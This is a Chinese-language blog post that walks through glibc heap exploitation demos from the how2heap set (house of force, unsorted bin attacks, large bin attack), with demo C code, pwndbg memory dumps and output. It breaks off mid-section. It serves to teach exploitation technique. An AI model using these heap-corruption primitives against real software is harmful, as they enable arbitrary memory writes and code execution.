---
title: how2heap-4
date: 2019-07-10 01:38:28
tags: pwn
---

# how2heap-4

<!--more-->

## house_of_force

Exploiting the Top Chunk (Wilderness) header in order to get malloc to return a nearly-arbitrary pointer

> house_of_force 是一种通过改写 top chunk 的 size 字段来欺骗 malloc 返回任意地址的技术。我们知道在空闲内存的最高处，必然存在一块空闲的 chunk，即 top chunk，当 bins 和 fast bins 都不能满足分配需要的时候，malloc 会从 top chunk 中分出一块内存给用户。所以 top chunk 的大小会随着分配和回收不停地变化。

### 解释

首先 malloc 一块内存
```
	fprintf(stderr, "\nLet's allocate the first chunk, taking space from the wilderness.\n");
	intptr_t *p1 = malloc(256);
	fprintf(stderr, "The chunk of 256 bytes has been allocated at %p.\n", p1 - sizeof(long)*2);
```

```
pwndbg> heap
0x603000 PREV_INUSE {
  prev_size = 0, 
  size = 273, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603110 PREV_INUSE {
  prev_size = 0, 
  size = 134897, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg> x/20gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000111      <-- chunk p1
0x603010:	0x0000000000000000	0x0000000000000000
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000000
pwndbg> x/10gx 0x603100
0x603100:	0x0000000000000000	0x0000000000000000
0x603110:	0x0000000000000000	0x0000000000020ef1      <-- top chunk
0x603120:	0x0000000000000000	0x0000000000000000
0x603130:	0x0000000000000000	0x0000000000000000
0x603140:	0x0000000000000000	0x0000000000000000
```

我们假设此时 p1 有溢出漏洞，我们可以去修改 top chunk 的 size：

``` c++
	//----- VULNERABILITY ----
	intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));
	fprintf(stderr, "\nThe top chunk starts at %p\n", ptr_top);

	fprintf(stderr, "\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n");
	fprintf(stderr, "Old size of top chunk %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
	*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;
	fprintf(stderr, "New size of top chunk %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
	//------------------------
```

修改后：

```
pwndbg> x/10gx 0x603100
0x603100:	0x0000000000000000	0x0000000000000000
0x603110:	0x0000000000000000	0xffffffffffffffff      <--  top chunk
0x603120:	0x0000000000000000	0x0000000000000000
0x603130:	0x0000000000000000	0x0000000000000000
0x603140:	0x0000000000000000	0x0000000000000000
```

我们发现 top chunk 被修改为了一个很大的数。

> 现在我们可以 malloc 一个任意大小的内存而不用调用 mmap 了。
> 接下来 malloc 一个 chunk，使得该 chunk 刚好分配到我们想要控制的那块区域为止，这样在下一次 malloc 时，就可以返回到我们想要控制的区域了。
> 计算方法是用目标地址减去 top chunk 地址，再减去 chunk 头的大小。

``` c++
	/*
	 * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):
	 * new_top = old_top + nb
	 * nb = new_top - old_top
	 * req + 2sizeof(long) = new_top - old_top
	 * req = new_top - old_top - 2sizeof(long)
	 * req = dest - 2sizeof(long) - old_top - 2sizeof(long)
	 * req = dest - old_top - 4*sizeof(long)
	 */
	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;
	fprintf(stderr, "\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n"
	   "we will malloc %#lx bytes.\n", bss_var, ptr_top, evil_size);
	void *new_ptr = malloc(evil_size);
	fprintf(stderr, "As expected, the new pointer is at the same place as the old top chunk: %p\n", new_ptr - sizeof(long)*2);
```

```
pwndbg> p/x &bss_var 
$6 = 0x602060
pwndbg> p/x ptr_top 
$7 = 0x603110
pwndbg> p/x evil_size 
$4 = 0xffffffffffffef30
```

```
pwndbg> heap
0x603000 PREV_INUSE {
  prev_size = 0, 
  size = 273, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603110 PREV_INUSE {
  prev_size = 0, 
  size = 18446744073709547329, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x602050 PREV_INUSE {
  prev_size = 0, 
  size = 4281, 
  fd = 0x2073692073696854, 
  bk = 0x676e697274732061, 
  fd_nextsize = 0x6577207461687420, 
  bk_nextsize = 0x6f7420746e617720
}
0x603108 {
  prev_size = 0, 
  size = 0, 
  fd = 0xffffffffffffef41, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```

这样就成功把 bss_var 分配了出来：

```
pwndbg> x/20xg 0x602050
0x602050:	0x0000000000000000	0x00000000000010b9
0x602060 <bss_var>:	0x2073692073696854	0x676e697274732061
0x602070 <bss_var+16>:	0x6577207461687420	0x6f7420746e617720
0x602080 <bss_var+32>:	0x6972777265766f20	0x00000000002e6574
0x602090:	0x0000000000000000	0x0000000000000000
0x6020a0 <stderr@@GLIBC_2.2.5>:	0x00007ffff7dd2540	0x0000000000000000
0x6020b0:	0x0000000000000000	0x0000000000000000
0x6020c0:	0x0000000000000000	0x0000000000000000
0x6020d0:	0x0000000000000000	0x0000000000000000
0x6020e0:	0x0000000000000000	0x0000000000000000
pwndbg> x/20s 0x602050
0x602050:	""
0x602051:	""
0x602052:	""
0x602053:	""
0x602054:	""
0x602055:	""
0x602056:	""
0x602057:	""
0x602058:	"\271\020"
0x60205b:	""
0x60205c:	""
0x60205d:	""
0x60205e:	""
0x60205f:	""
0x602060 <bss_var>:	"This is a string that we want to overwrite."
0x60208c:	""
0x60208d:	""
0x60208e:	""
0x60208f:	""
0x602090:	""
```

接下来如果我们再申请一块内存：

``` c++
	void* ctr_chunk = malloc(100);
	fprintf(stderr, "\nNow, the next chunk we overwrite will point at our target buffer.\n");
	fprintf(stderr, "malloc(100) => %p!\n", ctr_chunk);
	fprintf(stderr, "Now, we can finally overwrite that value:\n");
```

```
pwndbg> heap
0x603000 PREV_INUSE {
  prev_size = 0, 
  size = 273, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603110 PREV_INUSE {
  prev_size = 0, 
  size = 18446744073709547329, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x602050 FASTBIN {
  prev_size = 0, 
  size = 113, 
  fd = 0x2073692073696854, 
  bk = 0x676e697274732061, 
  fd_nextsize = 0x6577207461687420, 
  bk_nextsize = 0x6f7420746e617720
}
0x6020c0 PREV_INUSE {
  prev_size = 0, 
  size = 4169, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603108 {
  prev_size = 0, 
  size = 0, 
  fd = 0xffffffffffffef41, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg> p ctr_chunk 
$8 = (void *) 0x602060 <bss_var>
```

可以看出，bss_var 上的地址已经被分配。接下来就可以达到任意地址写的效果了。

### 输出：

```
$ ./glibc_2.25/house_of_force

Welcome to the House of Force

The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.
The top chunk is a special chunk. Is the last in memory and is the chunk that will be resized when malloc asks for more space from the os.

In the end, we will use this to overwrite a variable at 0x602060.
Its current value is: This is a string that we want to overwrite.

Let's allocate the first chunk, taking space from the wilderness.
The chunk of 256 bytes has been allocated at 0x603000.

Now the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.
Real size (aligned and all that jazz) of our allocated chunk is 280.

Now let's emulate a vulnerability that can overwrite the header of the Top Chunk

The top chunk starts at 0x603110

Overwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.
Old size of top chunk 0x20ef1
New size of top chunk 0xffffffffffffffff

The size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.
Next, we will allocate a chunk that will get us right up against the desired region (with an integer
overflow) and will then be able to allocate a chunk right over the desired region.

The value we want to write to at 0x602060, and the top chunk is at 0x603110, so accounting for the header size,
we will malloc 0xffffffffffffef30 bytes.
As expected, the new pointer is at the same place as the old top chunk: 0x603110

Now, the next chunk we overwrite will point at our target buffer.
malloc(100) => 0x602060!
Now, we can finally overwrite that value:
... old string: This is a string that we want to overwrite.
... doing strcpy overwrite with "YEAH!!!"...
... new string: YEAH!!!
```

## unsorted_bin_into_stack

Exploiting the overwrite of a freed chunk on unsorted bin freelist to return a nearly-arbitrary pointer.

> unsorted-bin-into-stack 通过改写 unsorted bin 里 chunk 的 bk 指针到任意地址，从而在栈上 malloc 出 chunk。 

### 解释

``` c++
  fprintf(stderr, "Allocating the victim chunk\n");
  intptr_t* victim = malloc(0x100);

  fprintf(stderr, "Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n");
  intptr_t* p1 = malloc(0x100);
```

我们在 malloc victim 后还需要 malloc 一块内存 p1 以防止 free victim 后它被放入 top chunk。

``` c++
  fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
  free(victim);
```

接下来 free victim，它会被放入 unsorted bin 中。

```
pwndbg> p victim 
$1 = (intptr_t *) 0x602010
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000
smallbins
empty
largebins
empty
```

接下来在栈上 fake 一块 chunk。

``` c++
  fprintf(stderr, "Create a fake chunk on the stack");
  fprintf(stderr, "Set size for next allocation and the bk pointer to any writable address");
  stack_buffer[1] = 0x100 + 0x10;
  stack_buffer[3] = (intptr_t)stack_buffer;
```

伪造的 bk 指向自身。

```
pwndbg> p/x &stack_buffer 
$3 = 0x7fffffffdc50
pwndbg> p/x stack_buffer 
$4 = {0x0, 0x110, 0x0, 0x7fffffffdc50}
```

假设此时有一个堆溢出漏洞，可以修改 victim 的内容：

``` c++
  //------------VULNERABILITY-----------
  fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->size and victim->bk pointer\n");
  fprintf(stderr, "Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && < av->system_mem\n");
  victim[-1] = 32;
  victim[1] = (intptr_t)stack_buffer; // victim->bk is pointing to stack
  //------------------------------------
```

但是在修改之前，我们要过一个 check：我们要修改的 size 要满足条件：size > 16 (x64)，size < `av->system_mem`。

因此我们修改 size 为 32，victim 的 bk 指向 stack_buffer。

```
pwndbg> p victim 
$5 = (intptr_t *) 0x602010
pwndbg> x/10xg victim - 2
0x602000:	0x0000000000000000	0x0000000000000020
0x602010:	0x00007ffff7dd1b78	0x00007fffffffdc50      <-- fd, fake bk
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
pwndbg> x/10xg 0x00007fffffffdc50
0x7fffffffdc50:	0x0000000000000000	0x0000000000000110      <-- fake chunk
0x7fffffffdc60:	0x0000000000000000	0x00007fffffffdc50
0x7fffffffdc70:	0x00007fffffffdd60	0xb6520ac971917b00
0x7fffffffdc80:	0x0000000000400870	0x00007ffff7a2d830
0x7fffffffdc90:	0x0000000000000001	0x00007fffffffdd68
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all [corrupted]
FD: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000
BK: 0x602000 —▸ 0x7fffffffdc50 ◂— 0x7fffffffdc50
smallbins
empty
largebins
empty
```

此时我们可以看到 fake chunk 已经被链接在 unsorted bin 中。下一次 malloc 时，malloc 会顺着 bk 指针进行遍历，这样就可以找到大小正好合适的 fake chunk 了：

``` c++
  fprintf(stderr, "Now next malloc will return the region of our fake chunk: %p\n", &stack_buffer[2]);
  fprintf(stderr, "malloc(0x100): %p\n", malloc(0x100));
```

```
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all [corrupted]
FD: 0x602000 —▸ 0x7ffff7dd1b88 (main_arena+104) ◂— 0x602000
BK: 0x7fffffffdc50 ◂— 0x7fffffffdc50
smallbins
0x20: 0x602000 —▸ 0x7ffff7dd1b88 (main_arena+104) ◂— 0x602000
largebins
empty
```

fake chunk 被取出，victim chunk 被从 unsorted bin 中取出放入了 small bin 中。

```
pwndbg> p/x stack_buffer 
$6 = {0x0, 0x110, 0x7ffff7dd1b78, 0x7fffffffdc50}
```

此时 fake chunk 的 fd 也被修改了，这里是 unsorted bin 的地址，通过它可以泄露 libc 的地址。

```
pwndbg> x/20xg stack_buffer 
0x7fffffffdc50:	0x0000000000000000	0x0000000000000110      <-- fake chunk
0x7fffffffdc60:	0x00007ffff7dd1b78	0x00007fffffffdc50      <-- new fd, bk
0x7fffffffdc70:	0x00007fffffffdd60	0xb6520ac971917b00
0x7fffffffdc80:	0x0000000000400870	0x00007ffff7a2d830
0x7fffffffdc90:	0x0000000000000001	0x00007fffffffdd68
0x7fffffffdca0:	0x00000001f7ffcca0	0x00000000004006a6
0x7fffffffdcb0:	0x0000000000000000	0x2ba995469c7be0c4
0x7fffffffdcc0:	0x00000000004005b0	0x00007fffffffdd60
0x7fffffffdcd0:	0x0000000000000000	0x0000000000000000
0x7fffffffdce0:	0xd4566a3935bbe0c4	0xd4567a83234be0c4
```

### 输出

```
$ ./glibc_2.25/unsorted_bin_into_stack
Allocating the victim chunk
Allocating another chunk to avoid consolidating the top chunk with the small one during the free()
Freeing the chunk 0x602010, it will be inserted in the unsorted bin
Create a fake chunk on the stackSet size for next allocation and the bk pointer to any writable addressNow emulating a vulnerability that can overwrite the victim->size and victim->bk pointer
Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && < av->system_mem
Now next malloc will return the region of our fake chunk: 0x7fffffffdc50
malloc(0x100): 0x7fffffffdc50
```

## unsorted_bin_attack

Exploiting the overwrite of a freed chunk on unsorted bin freelist to write a large value into arbitrary address

> unsorted bin 攻击通常是为更进一步的攻击做准备的，我们知道 unsorted bin 是一个双向链表，在分配时会通过 unlink 操作将 chunk 从链表中移除，所以如果能够控制 unsorted bin chunk 的 bk 指针，就可以向任意位置写入一个指针。这里通过 unlink 将 libc 的信息写入到我们可控的内存中，从而导致信息泄漏，为进一步的攻击提供便利。

### 解释

unlink 的对 unsorted bin 的操作是这样的：

``` c++
    /* remove from unsorted list */
        unsorted_chunks (av)->bk = bck;
        bck->fd = unsorted_chunks (av);
```

我们先申请两块 chunk，释放第一个使其加入 unsorted bin：

``` c++
	unsigned long *p=malloc(400);
	fprintf(stderr, "Now, we allocate first normal chunk on the heap at: %p\n",p);
	fprintf(stderr, "And allocate another normal chunk in order to avoid consolidating the top chunk with"
           "the first one during the free()\n\n");
	malloc(500);

	free(p);
	fprintf(stderr, "We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "
		   "point to %p\n",(void*)p[1]);
```

```
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000
smallbins
empty
largebins
empty
```

接下来，我们假设有堆溢出漏洞：

``` c++
	//------------VULNERABILITY-----------

	p[1]=(unsigned long)(&stack_var-2);
	fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");
	fprintf(stderr, "And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n",(void*)p[1]);

	//------------------------------------
```

这样的话把 p->bk 指向了 stack 上的 fake chunk - 2 的地址。

```
pwndbg> p p
$1 = (unsigned long *) 0x602010
pwndbg> x/20gx p-2
0x602000:	0x0000000000000000	0x00000000000001a1
0x602010:	0x00007ffff7dd1b78	0x00007fffffffdc68
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000000	0x0000000000000000
pwndbg> x/20gx p[1]
0x7fffffffdc68:	0x000000000040081e	0x0000000000400890
0x7fffffffdc78:	0x0000000000000000	0x0000000000602010
0x7fffffffdc88:	0x6ed73e366a987500	0x0000000000400890
0x7fffffffdc98:	0x00007ffff7a2d830	0x0000000000000001
0x7fffffffdca8:	0x00007fffffffdd78	0x00000001f7ffcca0
0x7fffffffdcb8:	0x00000000004006a6	0x0000000000000000
0x7fffffffdcc8:	0x5fdbc05b7ab47468	0x00000000004005b0
0x7fffffffdcd8:	0x00007fffffffdd70	0x0000000000000000
0x7fffffffdce8:	0x0000000000000000	0xa0243f24d2d47468
0x7fffffffdcf8:	0xa0242f9ec4447468	0x0000000000000000
pwndbg> heap
0x602000 PREV_INUSE {
  prev_size = 0, 
  size = 417, 
  fd = 0x7ffff7dd1b78 <main_arena+88>, 
  bk = 0x7fffffffdc68, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```

然后我们 malloc 一块新 chunk：

``` c++
	malloc(400);
	fprintf(stderr, "Let's malloc again to get the chunk we just free. During this time, the target should have already been "
		   "rewritten:\n");
	fprintf(stderr, "%p: %p\n", &stack_var, (void*)stack_var);
```

这个时候，malloc 循着 bk 去申请一块新 chunk：

```
pwndbg> x/20gx &stack_var - 2
0x7fffffffdc68:	0x0000000000400828	0x0000000000400890      <-- fake chunk
0x7fffffffdc78:	0x00007ffff7dd1b78	0x0000000000602010      <-- fd
0x7fffffffdc88:	0x6ed73e366a987500	0x0000000000400890
0x7fffffffdc98:	0x00007ffff7a2d830	0x0000000000000001
0x7fffffffdca8:	0x00007fffffffdd78	0x00000001f7ffcca0
0x7fffffffdcb8:	0x00000000004006a6	0x0000000000000000
0x7fffffffdcc8:	0x5fdbc05b7ab47468	0x00000000004005b0
0x7fffffffdcd8:	0x00007fffffffdd70	0x0000000000000000
0x7fffffffdce8:	0x0000000000000000	0xa0243f24d2d47468
0x7fffffffdcf8:	0xa0242f9ec4447468	0x0000000000000000
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0 
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all [corrupted]
FD: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000
BK: 0x7fffffffdc68 —▸ 0x602010 ◂— 0x0
smallbins
empty
largebins
empty
```

此时 fake chunk 的 fd 指向了 unsorted bin 的 head 地址了。

> 这也算是 unlink 的另一种用法，上一篇的总结中，unsafe_unlink 通过 unlink 来直接控制地址，这里则是通过 unlink 来泄漏 libc 的信息，来进行进一步的攻击。流程也较为简单。
> 和 house_of_lore 操作有点像，也是通过修改 victim 的 bk 字段，不过我们做这个的主要目的不是返回一个可控的地址，而是将libc的信息写到了我们可控的区域。

### 输出

```
$ ./glibc_2.25/unsorted_bin_attack
This file demonstrates unsorted bin attack by write a large unsigned long value into stack
In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack

Let's first look at the target we want to rewrite on stack:
0x7fffffffdcc8: 0

Now, we allocate first normal chunk on the heap at: 0x602010
And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()

We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7ffff7dd1b78
Now emulating a vulnerability that can overwrite the victim->bk pointer
And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7fffffffdcb8

Let's malloc again to get the chunk we just free. During this time, the target should have already been rewritten:
0x7fffffffdcc8: 0x7ffff7dd1b78
```

## large_bin_attack

Exploiting the overwrite of a freed chunk on large bin freelist to write a large value into arbitrary address

### 解释

这个文件通过向栈上写数据以展示 large bin attack。

实际上，large bin attack 通常被作为其他攻击的基础，例如重写 libc 中的全局变量。

首先 malloc 第一个 large chunk：

``` c++
    unsigned long *p1 = malloc(0x320);
    fprintf(stderr, "Now, we allocate the first large chunk on the heap at: %p\n", p1 - 2);
```

接下来为了避免合并下一个 large chunk 时与第一块 large chunk 合并，我们申请一块 fastbin chunk。

``` c++
    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
           " the first large chunk during the free()\n\n");
    malloc(0x20);
```

再申请第二块 large chunk：

``` c++
    unsigned long *p2 = malloc(0x400);
    fprintf(stderr, "Then, we allocate the second large chunk on the heap at: %p\n", p2 - 2);
```

为了避免下一块 large chunk free 的时候与 第二块合并，再申请一块 fastbin。

``` c++
    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
           " the second large chunk during the free()\n\n");
    malloc(0x20);
```

最后申请第三块 large chunk，和上面类似，为了防止 free 的时候与 top chunk 合并，我们还要申请一块 fastbin。

``` c++
    unsigned long *p3 = malloc(0x400);
    fprintf(stderr, "Finally, we allocate the third large chunk on the heap at: %p\n", p3 - 2);
 
    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the top chunk with"
           " the third large chunk during the free()\n\n");
    malloc(0x20);
```

接下来释放第一块 large chunk 和第二块 large chunk。

``` c++
    free(p1);
    free(p2);
    fprintf(stderr, "We free the first and second large chunks now and they will be inserted in the unsorted bin:"
           " [ %p <--> %p ]\n\n", (void *)(p2 - 2), (void *)(p2[0]));
```

它们会被加入 unsorted bin 中：

```
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x603360 —▸ 0x603000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603360 /* '`3`' */
smallbins
empty
largebins
empty
```

接下来申请一块比释放的第一块 chunk 稍小的 chunk：

``` c++
    malloc(0x90);
    fprintf(stderr, "Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the"
            " freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation"
            ", and reinsert the remaining of the freed first large chunk into the unsorted bin:"
            " [ %p ]\n\n", (void *)((char *)p1 + 0x90));
```

在这个过程中，第二块释放的 large chunk 会被移入 large bin，并且会用释放的第一块 large chunk 空间进行分配，剩下的部分仍会被放入 unsorted bin 中。

整理的过程如下所示，需要注意的是 large bins 中 chunk 按 fd 指针的顺序从大到小排列，如果大小相同则按照最近使用顺序排列：

```c++

    //This technique is taken from
    //https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/

    //[...]

              else
              {
                  victim->fd_nextsize = fwd;
                  victim->bk_nextsize = fwd->bk_nextsize;
                  fwd->bk_nextsize = victim;
                  victim->bk_nextsize->fd_nextsize = victim;
              }
              bck = fwd->bk;

    //[...]

    mark_bin (av, victim_index);
    victim->bk = bck;
    victim->fd = fwd;
    fwd->bk = victim;
    bck->fd = victim;

    //For more details on how large-bins are handled and sorted by ptmalloc,
    //please check the Background section in the aforementioned link.

    //[...]

```

堆的数据如下：

```
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x6030a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6030a0
smallbins
empty
largebins
0x400: 0x603360 —▸ 0x7ffff7dd1f68 (main_arena+1096) ◂— 0x603360 /* '`3`' */
pwndbg> p p1
$1 = (unsigned long *) 0x603010
pwndbg> p p2
$2 = (unsigned long *) 0x603370
pwndbg> heap
0x603000 PREV_INUSE {
  prev_size = 0, 
  size = 161, 
  fd = 0x7ffff7dd1e98 <main_arena+888>, 
  bk = 0x7ffff7dd1e98 <main_arena+888>, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x6030a0 PREV_INUSE {
  prev_size = 0, 
  size = 657, 
  fd = 0x7ffff7dd1b78 <main_arena+88>, 
  bk = 0x7ffff7dd1b78 <main_arena+88>, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603330 {
  prev_size = 656, 
  size = 48, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```

接下来 free large chunk 3。

``` c++
    free(p3);
    fprintf(stderr, "Now, we free the third large chunk and it will be inserted in the unsorted bin:"
           " [ %p <--> %p ]\n\n", (void *)(p3 - 2), (void *)(p3[0]));
```

它会被插入到 unsorted bin 中：

```
pwndbg> p p3
$3 = (unsigned long *) 0x6037b0
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x6037a0 —▸ 0x6030a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6037a0
smallbins
empty
largebins
0x400: 0x603360 —▸ 0x7ffff7dd1f68 (main_arena+1096) ◂— 0x603360 /* '`3`' */
```

接下来假设有栈堆溢出，可以覆盖第二块 large chunk 的 size 和 bk、bk_nextsize 指针。

``` c++
    //------------VULNERABILITY-----------

    fprintf(stderr, "Now emulating a vulnerability that can overwrite the freed second large chunk's \"size\""
            " as well as its \"bk\" and \"bk_nextsize\" pointers\n");
    fprintf(stderr, "Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk"
            " at the head of the large bin freelist. To overwrite the stack variables, we set \"bk\" to 16 bytes before stack_var1 and"
            " \"bk_nextsize\" to 32 bytes before stack_var2\n\n");

    p2[-1] = 0x3f1;
    p2[0] = 0;
    p2[2] = 0;
    p2[1] = (unsigned long)(&stack_var1 - 2);
    p2[3] = (unsigned long)(&stack_var2 - 4);

    //------------------------------------
```

我们减少释放的第二块 large chunk 的 size 以迫使 malloc 插入释放的位于 large bin freelist 首部的第三块 large chunk。

为了覆盖栈上的变量，我们将 bk 指向 stack_var1 的 16 bytes 前，bk_nextsize 指向 stack_var2 的 32 bytes 前：

修改前：

```
pwndbg> p p2
$4 = (unsigned long *) 0x603370
pwndbg> x/20xg p2-2
0x603360:	0x0000000000000000	0x0000000000000411
0x603370:	0x00007ffff7dd1f68	0x00007ffff7dd1f68
0x603380:	0x0000000000603360	0x0000000000603360
0x603390:	0x0000000000000000	0x0000000000000000
0x6033a0:	0x0000000000000000	0x0000000000000000
0x6033b0:	0x0000000000000000	0x0000000000000000
0x6033c0:	0x0000000000000000	0x0000000000000000
0x6033d0:	0x0000000000000000	0x0000000000000000
0x6033e0:	0x0000000000000000	0x0000000000000000
0x6033f0:	0x0000000000000000	0x0000000000000000
```

修改后：

```
pwndbg> p &stack_var1 
$6 = (unsigned long *) 0x7fffffffdc70
pwndbg> p &stack_var2 
$7 = (unsigned long *) 0x7fffffffdc78
pwndbg> x/20xg p2-2
0x603360:	0x0000000000000000	0x00000000000003f1      <-- fake p2 [be freed]
0x603370:	0x0000000000000000	0x00007fffffffdc60      <-- fd, fake bk
0x603380:	0x0000000000000000	0x00007fffffffdc58      <--     fake bk_nextsize
0x603390:	0x0000000000000000	0x0000000000000000
0x6033a0:	0x0000000000000000	0x0000000000000000
0x6033b0:	0x0000000000000000	0x0000000000000000
0x6033c0:	0x0000000000000000	0x0000000000000000
0x6033d0:	0x0000000000000000	0x0000000000000000
0x6033e0:	0x0000000000000000	0x0000000000000000
0x6033f0:	0x0000000000000000	0x0000000000000000
```

```
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x6037a0 —▸ 0x6030a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6037a0
smallbins
empty
largebins
0x400 [corrupted]
FD: 0x603360 ◂— 0x0
BK: 0x603360 —▸ 0x7fffffffdc60 ◂— 0x0
```

接下来再次 malloc：

``` c++
    malloc(0x90);
 
    fprintf(stderr, "Let's malloc again, so the freed third large chunk being inserted into the large bin freelist."
            " During this time, targets should have already been rewritten:\n");

    fprintf(stderr, "stack_var1 (%p): %p\n", &stack_var1, (void *)stack_var1);
    fprintf(stderr, "stack_var2 (%p): %p\n", &stack_var2, (void *)stack_var2);
```

被释放的第三块 large chunk 会被插入 large bin list 中。

这个过程中判断条件会进入上面整理过程的 else 分支中。判断条件是 `(unsigned long) (size) < (unsigned long) (bck->bk->size)`。

``` c++
              else
              {
                  victim->fd_nextsize = fwd;
                  victim->bk_nextsize = fwd->bk_nextsize;
                  fwd->bk_nextsize = victim;
                  victim->bk_nextsize->fd_nextsize = victim;
              }
              bck = fwd->bk;
```

其中 fwd 是 fake p2，victim 是 p3，bck 会被赋值为 `&stack_var1 - 2`。

在 p3 被放回 large bin 并排序的过程中，我们让位于栈上的两个变量也被修改成了 victim。对应的语句分别是 `bck->fd = victim;` 和 `ictim->bk_nextsize->fd_nextsize = victim;`。

```
pwndbg> x/10xg p3-2
0x6037a0:	0x0000000000000000	0x0000000000000411
0x6037b0:	0x0000000000603360	0x00007fffffffdc60
0x6037c0:	0x0000000000603360	0x00007fffffffdc58
0x6037d0:	0x0000000000000000	0x0000000000000000
